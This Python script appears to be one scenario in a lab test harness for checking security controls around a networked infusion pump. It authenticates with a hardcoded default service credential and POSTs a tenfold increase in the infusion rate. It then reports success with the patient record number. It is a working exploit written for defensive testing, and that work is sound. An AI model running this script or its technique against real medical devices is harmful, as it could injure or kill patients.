#!/usr/bin/env python3
"""
Scenario 05 — Default credential exploitation (Elevation of Privilege, E category).

Uses the publicly-disclosed hardcoded service credential to authenticate to the
management interface and modify infusion parameters. The headline scenario for
demonstrating Pattern A (PAM upstream) compensating-control effectiveness.

Compensating controls expected to mitigate:
  - PAM upstream: management interface reachable only from PAM IP, not attacker IP
  - Network segmentation: management port not reachable across zone boundary
  - IPS virtual patching: optional signature for direct mgmt POST from non-PAM origin
"""

import base64
import json
import os
import urllib.request
import urllib.error

STRIDE_HC = "E"
SCENARIO_NAME = "05-eop-default-credential"

TARGET_HOST = os.environ.get("TARGET_HOST", "172.28.10.20")
TARGET_PORT = int(os.environ.get("TARGET_MGMT_PORT", "8080"))


def run() -> dict:
    # Publicly-disclosed credential — the constraint under test
    token = base64.b64encode(b"service:Vendor1234").decode()

    # Step 1: confirm credential validity by reading current state
    print(f"[05] Probing /infusion with default credential")
    req = urllib.request.Request(
        f"http://{TARGET_HOST}:{TARGET_PORT}/infusion",
        headers={"Authorization": f"Basic {token}"},
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            current = json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        if e.code == 401:
            return {
                "scenario": SCENARIO_NAME,
                "stride_hc": STRIDE_HC,
                "outcome": "BLOCKED_AUTH",
                "detail": "Authentication failed (unexpected — PAM may have stripped or rotated credential)",
            }
        return {
            "scenario": SCENARIO_NAME,
            "stride_hc": STRIDE_HC,
            "outcome": "BLOCKED_HTTP",
            "detail": f"HTTP {e.code}",
        }
    except (urllib.error.URLError, OSError) as e:
        return {
            "scenario": SCENARIO_NAME,
            "stride_hc": STRIDE_HC,
            "outcome": "BLOCKED_NET",
            "detail": f"Network unreachable: {e}",
        }

    # Step 2: attempt malicious modification — increase infusion rate by 10x
    print(f"[05] Default credential accepted; attempting unauthorised modification")
    new_rate = current.get("rate_ml_per_hour", 100) * 10
    payload = json.dumps({"rate_ml_per_hour": new_rate}).encode()

    req2 = urllib.request.Request(
        f"http://{TARGET_HOST}:{TARGET_PORT}/infusion",
        data=payload,
        method="POST",
        headers={
            "Authorization": f"Basic {token}",
            "Content-Type": "application/json",
        },
    )
    try:
        with urllib.request.urlopen(req2, timeout=5) as resp:
            updated = json.loads(resp.read().decode())
    except urllib.error.URLError as e:
        return {
            "scenario": SCENARIO_NAME,
            "stride_hc": STRIDE_HC,
            "outcome": "PARTIAL",
            "detail": f"Auth succeeded but modification failed: {e}",
        }

    if updated.get("ok"):
        return {
            "scenario": SCENARIO_NAME,
            "stride_hc": STRIDE_HC,
            "outcome": "SUCCESS",
            "detail": (
                f"Successful EoP — modified infusion rate from "
                f"{current.get('rate_ml_per_hour')} to {updated['infusion'].get('rate_ml_per_hour')} mL/h "
                f"on patient MRN {current.get('patient_mrn')}"
            ),
        }
    return {
        "scenario": SCENARIO_NAME,
        "stride_hc": STRIDE_HC,
        "outcome": "PARTIAL",
        "detail": str(updated),
    }


if __name__ == "__main__":
    print(json.dumps(run(), indent=2))
